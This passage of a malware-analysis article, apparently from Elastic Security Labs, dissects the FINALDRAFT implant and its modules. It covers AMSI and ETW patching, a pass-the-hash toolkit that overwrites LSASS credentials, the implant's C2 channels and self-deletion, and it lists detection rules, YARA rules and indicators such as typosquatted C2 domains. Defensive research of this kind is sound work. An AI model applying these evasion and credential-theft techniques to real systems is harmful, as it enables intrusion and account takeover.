information\",width:\"1055\",height:\"253\"})}),`\n`,(0,i.jsxs)(e.h4,{id:\"powershell-execution-psloaderx64dll\",children:[\"PowerShell execution (\",(0,i.jsx)(e.code,{children:\"Psloader.x64.dll\"}),\")\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This module allows the operator to execute PowerShell commands without invoking the \",(0,i.jsx)(e.code,{children:\"powershell.exe\"}),\" binary. The code used is taken from \",(0,i.jsx)(e.a,{href:\"https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/SharpPick/Program.cs\",rel:\"nofollow\",children:\"PowerPick\"}),\", a well-known open source offensive security tool.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"To evade detection, the module first hooks the \",(0,i.jsx)(e.code,{children:\"EtwEventWrite\"}),\", \",(0,i.jsx)(e.code,{children:\"ReportEventW\"}),\", and \",(0,i.jsx)(e.code,{children:\"AmsiScanBuffer\"}),\" APIs, forcing them to always return \",(0,i.jsx)(e.code,{children:\"0\"}),\", which disables ETW logging and bypasses anti-malware scans.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image20.png\",alt:\"Patching AMSI and ETW APis\",width:\"639\",height:\"140\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Next, the DLL loads a .NET payload (\",(0,i.jsx)(e.a,{href:\"https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/SharpPick/Program.cs\",rel:\"nofollow\",children:\"PowerPick\"}),\") stored in its \",(0,i.jsx)(e.code,{children:\".data\"}),\" section using the \",(0,i.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces\",rel:\"nofollow\",children:\"CLR Hosting technique\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image25.png\",alt:\"Managed code of PowerPick loaded using CLR hosting technique\",width:\"1254\",height:\"649\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The module creates a named pipe (\",(0,i.jsx)(e.code,{children:\"\\\\\\\\.\\\\Pipe\\\\BD5AE956-0CF5-44b5-8061-208F5D0DBBB2\"}),\") which is used for command forwarding and output retrieval. The main thread is designated as the receiver, while a secondary thread is created to write data to the pipe. Finally, the managed \",(0,i.jsx)(e.strong,{children:\"PowerPick\"}),\" binary is loaded and executed by the module.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image26.png\",alt:\"Managed binary of PowerPick loaded by the module\",width:\"1222\",height:\"507\"})}),`\n`,(0,i.jsxs)(e.h4,{id:\"pass-the-hash-toolkit-pntx64dll\",children:[\"Pass-the-Hash toolkit (\",(0,i.jsx)(e.code,{children:\"pnt.x64.dll\"}),\")\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This module is a custom Pass-the-Hash (PTH) toolkit used to start new processes with stolen NTLM hashes. This PTH implementation is largely inspired by the one used by \",(0,i.jsx)(e.a,{href:\"https://github.com/gentilkiwi/mimikatz\",rel:\"nofollow\",children:\"Mimikatz\"}),\", enabling lateral movement.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image45.png\",alt:\"Decrypted strings from memory for PTH module\",width:\"757\",height:\"325\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"A password (\",(0,i.jsx)(e.code,{children:\"Aslire597\"}),\"), domain, and username with the NTLM hash, along with the file path of the program to be elevated, are required by this module. In our sample, this command line is loaded by the sRDI shellcode. Below is an example of the command line.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:\"program.exe \u003cpassword\u003e \u003cdomain\u003e\\\\\u003caccount\u003e:\u003cntlm_hash\u003e \u003ctarget_process\u003e\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Like the other module, it creates a named pipe, \\u201D\",(0,i.jsx)(e.code,{children:\"\\\\\\\\.\\\\Pipe\\\\EAA0BF8D-CA6C-45eb-9751-6269C70813C9\"}),\"\\u201D, and awaits incoming connections from FINALDRAFT. This named pipe serves as a logging channel.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image21.png\",alt:\"named pipe creation for pnt.x64.dll\",width:\"617\",height:\"43\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"After establishing the pipe connection, the malware creates a target process in a suspended state using \",(0,i.jsx)(e.code,{children:\"CreateProcessWithLogonW\"}),\", identifies key structures like the \",(0,i.jsx)(e.code,{children:\"LogonSessionList\"}),\" and \",(0,i.jsx)(e.code,{children:\"LogonSessionListCount\"}),\" within the Local Security Authority Subsystem Service (LSASS) process, targeting the logon session specified by the provided argument.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[`Once the correct session is matched, the current credential structure inside LSASS is overwritten with the supplied NTLM hash instead of the current user's NTLM hash, and finally, the process thread is resumed. This technique is well explained in the blog post \"`,(0,i.jsx)(e.a,{href:\"https://www.praetorian.com/blog/inside-mimikatz-part2/\",rel:\"nofollow\",children:\"Inside the Mimikatz Pass-the-Hash Command (Part 2)\"}),'\" by Praetorian. The result is then sent to the named pipe.']}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image22.png\",alt:\"Named pipe output and created process\",width:\"993\",height:\"383\"})}),`\n`,(0,i.jsx)(e.h2,{id:\"finaldraft-elf-variant\",children:\"FINALDRAFT ELF variant\"}),`\n`,(0,i.jsx)(e.p,{children:\"During this investigation, we discovered an ELF variant of FINALDRAFT. This version supports more transport protocols than the PE version, but has fewer features, suggesting it might be under development.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"additional-transport-channels\",children:\"Additional transport channels\"}),`\n`,(0,i.jsx)(e.p,{children:\"The ELF variant of FINALDRAFT supports seven additional protocols for C2 transport channels:\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.th,{align:\"left\",children:\"C2 communication protocols\"})})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"HTTP/HTTPS\"})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"Reverse UDP\"})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"ICMP\"})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"Bind TCP\"})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"Reverse TCP\"})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"DNS\"})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"Outlook via REST API (could be communicating with an API proxy)\"})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"Outlook via Graph API\"})})]})]})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"FINALDRAFT ELF variant C2 communication options\"})}),`\n`,(0,i.jsx)(e.p,{children:\"From the ELF samples discovered, we have identified implants configured to use the HTTP and Outlook via Graph API channels.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"While the code structure is similar to the most contemporary PE sample, at the time of this publication, some parts of the implant's functionality were modified to conform to the Linux environment. For example, new Microsoft OAuth refresh tokens requested are written to a file on disk, either \",(0,i.jsx)(e.code,{children:\"/var/log/installlog.log.\u003cUUID_from_config\u003e\"}),\" or \",(0,i.jsx)(e.code,{children:\"/mnt/hgfsdisk.log.\u003cUUID_from_config\u003e\"}),\" if it fails to write to the prior file.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Below is a snippet of the configuration which uses the HTTP channel. We can see two C2 servers are used in place of a Microsoft refresh token, the port number \",(0,i.jsx)(e.code,{children:\"0x1bb\"}),\" (\",(0,i.jsx)(e.code,{children:\"443\"}),\") at offset \",(0,i.jsx)(e.code,{children:\"0xc8\"}),\", and flag for using HTTPS at offset \",(0,i.jsx)(e.code,{children:\"0xfc\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image2.png\",alt:\"FINALDRAFT ELF variant configuration snippet\",width:\"743\",height:\"389\"})}),`\n`,(0,i.jsx)(e.p,{children:`The domains are intentionally designed to typosquat well-known vendors, such as \"VMSphere\" (VMware vSphere). However, it's unclear which vendor \"Hobiter\" is attempting to impersonate in this instance.`}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.th,{align:\"left\",children:\"C2\"})})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"support.vmphere.com\"})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:\"update.hobiter.com\"})})]})]})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Domain list\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"commands-1\",children:\"Commands\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image32.png\",alt:\"Command handlers\",width:\"895\",height:\"637\"})}),`\n`,(0,i.jsx)(e.p,{children:\"All of the commands overlap with its Windows counterpart, but offer fewer options. There are two C2 commands dedicated to collecting information about the victim's machine. Together, these commands gather the following details:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Hostname\"}),`\n`,(0,i.jsx)(e.li,{children:\"Current logged-in user\"}),`\n`,(0,i.jsx)(e.li,{children:\"Intranet IP address\"}),`\n`,(0,i.jsx)(e.li,{children:\"External IP address\"}),`\n`,(0,i.jsx)(e.li,{children:\"Gateway IP address\"}),`\n`,(0,i.jsx)(e.li,{children:\"System boot time\"}),`\n`,(0,i.jsx)(e.li,{children:\"Operating system name and version\"}),`\n`,(0,i.jsx)(e.li,{children:\"Kernel version\"}),`\n`,(0,i.jsx)(e.li,{children:\"System architecture\"}),`\n`,(0,i.jsx)(e.li,{children:\"Machine GUID\"}),`\n`,(0,i.jsx)(e.li,{children:\"List of active network connections\"}),`\n`,(0,i.jsx)(e.li,{children:\"List of running processes\"}),`\n`,(0,i.jsx)(e.li,{children:\"Name of current process\"}),`\n`]}),`\n`,(0,i.jsx)(e.h4,{id:\"command-execution\",children:\"Command Execution\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"While there are no process injection capabilities, the implant can execute shell commands directly. It utilizes \",(0,i.jsx)(e.code,{children:\"popen\"}),\" for command execution, capturing both standard output and errors, and sending the results back to the C2 infrastructure.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image28.png\",alt:\"Executing shell command\",width:\"1052\",height:\"287\"})}),`\n`,(0,i.jsx)(e.h4,{id:\"self-deletion\",children:\"Self Deletion\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"To dynamically resolve the path of the currently running executable, its symlink pointing to the executable image is passed to \",(0,i.jsx)(e.code,{children:\"sys_readlink\"}),\". \",(0,i.jsx)(e.code,{children:\"sys_unlink\"}),\" is then called to remove the executable file from the filesystem.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image11.png\",alt:\"Self deletion using sys_unlink\",width:\"1121\",height:\"299\"})}),`\n`,(0,i.jsx)(e.h2,{id:\"older-finaldraft-pe-sample\",children:\"Older FINALDRAFT PE sample\"}),`\n`,(0,i.jsx)(e.p,{children:\"During our investigation, we identified an older version of FINALDRAFT. This version supports half as many commands but includes an additional transport protocol alongside the MS Graph API/Outlook transport channel.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The name of the binary is \",(0,i.jsx)(e.code,{children:\"Session.x64.dll\"}),\", and its entrypoint export is called \",(0,i.jsx)(e.code,{children:\"GoogleProxy\"}),\":\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image5.png\",alt:\"PE export of FINALDRAFT\",width:\"588\",height:\"117\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"http-transport-channel\",children:\"HTTP transport channel\"}),`\n`,(0,i.jsx)(e.p,{children:\"This older version of FINALDRAFT selects between the Outlook or HTTP transport channel based on the configuration.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image59.png\",alt:\"Choice between Outlook and HTTP transport channels\",width:\"484\",height:\"268\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"In this sample, the configuration contains a list of hosts instead of the refresh token found in the main sample. These same domains were used by PATHLOADER, the domain (\",(0,i.jsx)(e.code,{children:\"checkponit[.]com\"}),\") was registered on 2022-08-26T09:43:16Z and domain (\",(0,i.jsx)(e.code,{children:\"fortineat[.]com\"}),\") was registred on 2023-11-08T09:47:47Z.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image6.png\",alt:\"Domains found in the configuration\",width:\"579\",height:\"94\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The domains purposely typosquat real known vendors, \",(0,i.jsx)(e.strong,{children:\"CheckPoint\"}),\" and \",(0,i.jsx)(e.strong,{children:\"Fortinet\"}),\", in this case.\"]}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.th,{align:\"left\",children:\"C2\"})})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"poster.checkponit[.]com\"})})}),(0,i.jsx)(e.tr,{children:(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"support.fortineat[.]com\"})})})]})]})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Domain list\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"shell-command\",children:\"Shell command\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"An additional command exists in this sample that is not present in later versions. This command, with ID \",(0,i.jsx)(e.code,{children:\"1\"}),\", executes a shell command.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image9.png\",alt:\"Shell command handler setup\",width:\"514\",height:\"37\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The execution is carried out by creating a \",(0,i.jsx)(e.code,{children:\"cmd.exe\"}),\" process with the \",(0,i.jsx)(e.code,{children:'\"/c\"'}),\" parameter, followed by appending the actual command to the parameter.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image60.png\",alt:\"Create piped cmd.exe process\",width:\"482\",height:\"278\"})}),`\n`,(0,i.jsx)(e.h1,{id:\"detection\",children:\"Detection\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic Defend detects the process injection mechanism through two rules. The first rule detects the \",(0,i.jsx)(e.code,{children:\"WriteProcessMemory\"}),\" API call targeting another process, which is a common behavior observed in process injection techniques.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image42.png\",alt:\"Detecting WriteProcessMemory in FINALDRAFT process injection\",width:\"776\",height:\"326\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The second rule detects the creation of a remote thread to execute the shellcode.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image35.png\",alt:\"Detection of injected shellcode thread\",width:\"697\",height:\"276\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"We also detect the loading of the PowerShell engine by the \",(0,i.jsx)(e.code,{children:\"Psloader.x64.dll\"}),\" module, which is injected into the known target \",(0,i.jsx)(e.code,{children:\"mspaint.exe\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image4.png\",alt:\"Detection of PowerShell engine loads\",width:\"791\",height:\"285\"})}),`\n`,(0,i.jsx)(e.h1,{id:\"malware-and-mitre-attck\",children:\"Malware and MITRE ATT\u0026CK\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic uses the \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/\",rel:\"nofollow\",children:\"MITRE ATT\u0026CK\"}),\" framework to document common tactics, techniques, and procedures that threats use against enterprise networks.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"tactics\",children:\"Tactics\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0011/\",rel:\"nofollow\",children:\"Command and Control\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0005/\",rel:\"nofollow\",children:\"Defense Evasion\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0007/\",rel:\"nofollow\",children:\"Discovery\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0002/\",rel:\"nofollow\",children:\"Execution\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0010/\",rel:\"nofollow\",children:\"Exfiltration\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0008/\",rel:\"nofollow\",children:\"Lateral Movement\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"techniques\",children:\"Techniques\"}),`\n`,(0,i.jsx)(e.p,{children:\"Techniques represent how an adversary achieves a tactical goal by performing an action.\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1102/003/\",rel:\"nofollow\",children:\"Web Service: One-Way Communication\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1573/001/\",rel:\"nofollow\",children:\"Encrypted Channel: Symmetric Cryptography\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1564/003/\",rel:\"nofollow\",children:\"Hide Artifacts: Hidden Window\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1036/005/\",rel:\"nofollow\",children:\"Masquerading: Match Legitimate Name or Location\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1036/003/\",rel:\"nofollow\",children:\"Masquerading: Rename System Utilities\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1055/002/\",rel:\"nofollow\",children:\"Process Injection: Portable Executable Injection\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1620/\",rel:\"nofollow\",children:\"Reflective Code Loading\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1550/002/\",rel:\"nofollow\",children:\"Use Alternate Authentication Material: Pass the Hash\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1046/\",rel:\"nofollow\",children:\"Network Service Discovery\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1057/\",rel:\"nofollow\",children:\"Process Discovery\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1012/\",rel:\"nofollow\",children:\"Query Registry\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1567/\",rel:\"nofollow\",children:\"Exfiltration Over Web Service\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h1,{id:\"mitigations\",children:\"Mitigations\"}),`\n`,(0,i.jsx)(e.h2,{id:\"detection-1\",children:\"Detection\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_suspicious_memory_write_to_a_remote_process.toml\",rel:\"nofollow\",children:\"Suspicious Memory Write to a Remote Process\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/execution_unusual_powershell_engine_imageload.toml\",rel:\"nofollow\",children:\"Unusual PowerShell Engine ImageLoad\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_amsi_bypass_via_unbacked_memory.toml\",rel:\"nofollow\",children:\"AMSI Bypass via Unbacked Memory\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_amsi_or_wldp_bypass_via_memory_patching.toml\",rel:\"nofollow\",children:\"AMSI or WLDP Bypass via Memory Patching\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/privilege_escalation_suspicious_execution_via_windows_services.toml\",rel:\"nofollow\",children:\"Suspicious Execution via Windows Service\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_execution_via_windows_command_line_debugging_utility.toml\",rel:\"nofollow\",children:\"Execution via Windows Command Line Debugging Utility\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_suspicious_parent_child_relationship.toml\",rel:\"nofollow\",children:\"Suspicious Parent-Child Relationship\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"yara\",children:\"YARA\"}),`\n`,(0,i.jsx)(e.p,{children:\"Elastic Security has created the following YARA rules related to this post:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_PathLoader.yar\",rel:\"nofollow\",children:\"Windows.Trojan.PathLoader\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_FinalDraft.yar\",rel:\"nofollow\",children:\"Windows.Trojan.FinalDraft\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Trojan_FinalDraft.yar\",rel:\"nofollow\",children:\"Linux.Trojan.FinalDraft\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Multi_Trojan_FinalDraft.yar\",rel:\"nofollow\",children:\"Multi.Trojan.FinalDraft\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h1,{id:\"observations\",children:\"Observations\"}),`\n`,(0,i.jsx)(e.p,{children:\"The following observables were discussed in this research:\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{align:\"left\",children:\"Observable\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Type\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Reference\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Date\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf\"})}),(0,i.jsx)(e.td,{align:\"left\",children:\"SHA256\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"PATHLOADER\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"VT first seen: 2023-05-09 09:44:45 UTC\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"39e85de1b1121dc38a33eca97c41dbd9210124162c6d669d28480c833e059530\"})}),(0,i.jsx)(e.td,{align:\"left\",children:\"SHA256\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"FINALDRAFT initial sample\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"Telemetry first seen: 2024-11-28 20:49:18.646\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"83406905710e52f6af35b4b3c27549a12c28a628c492429d3a411fdb2d28cc8c\"})}),(0,i.jsx)(e.td,{align:\"left\",children:\"SHA256\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"FINALDRAFT ELF variant\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"VT first seen: 2024-10-05 07:15:00 UTC\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"poster.checkponit[.]com\"})}),(0,i.jsx)(e.td,{align:\"left\",children:\"domain\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"PATHLOADER/FINALDRAFT domain\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"Creation date: 2022-08-26T09:43:16Z  Valid until: 2025-08-26T07:00:00Z\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"support.fortineat[.]com\"})}),(0,i.jsx)(e.td,{align:\"left\",children:\"domain\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"PATHLOADER/FINALDRAFT domain\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"Creation date: 2023-11-08T09:47:47Z Valid until: 2024-11-08T09:47:47.00Z\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"support.vmphere[.]com\"})}),(0,i.jsx)(e.td,{align:\"left\",children:\"domain\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"FINALDRAFT domain\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"Creation date: 2023-09-12T12:35:57Z Valid until: 2025-09-12T12:35:57Z\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.code,{children:\"update.hobiter[.]com\"})}),(0,i.jsx)(e.td,{align:\"left\",children:\"domain\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"FINALDRAFT domain\"}),(0,i.jsx)(e.td,{align:\"left\",children:\"Creation date: 2023-09-12T12:35:58Z Valid until: 2025-09-12T12:35:58Z\"})]})]})]})})]})}function v(n={}){let{wrapper:e}=n.components||{};return e?(0,i.jsx)(e,Object.assign({},n,{children:(0,i.jsx)(c,n)})):c(n)}var A=v;return T(_);})();\n;return Component;"},"_id":"articles/finaldraft.mdx","_raw":{"sourceFilePath":"articles/finaldraft.mdx","sourceFileName":"finaldraft.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/finaldraft"},"type":"Article","imageUrl":"/assets/images/finaldraft/Security Labs Images 13.jpg","readingTime":"34 min read","series":"","url":"/finaldraft","headings":[{"level":2,"title":"PATHLOADER","href":"#pathloader"},{"level":3,"title":"Configuration","href":"#configuration"},{"level":3,"title":"API Hashing","href":"#api-hashing"},{"level":3,"title":"String Obfuscation","href":"#string-obfuscation"},{"level":3,"title":"Execution/Behavior","href":"#executionbehavior"},{"level":2,"title":"FINALDRAFT","href":"#finaldraft"},{"level":3,"title":"Entrypoint","href":"#entrypoint"},{"level":3,"title":"Initialization","href":"#initialization"},{"level":4,"title":"Configuration loading process","href":"#configuration-loading-process"},{"level":4,"title":"Session ID derivation process","href":"#session-id-derivation-process"},{"level":3,"title":"Communication protocol","href":"#communication-protocol"},{"level":3,"title":"Commands","href":"#commands"},{"level":3,"title":"Gather computer information","href":"#gather-computer-information"},{"level":3,"title":"Process injection","href":"#process-injection"},{"level":3,"title":"Forwarding data from TCP, UDP, and named 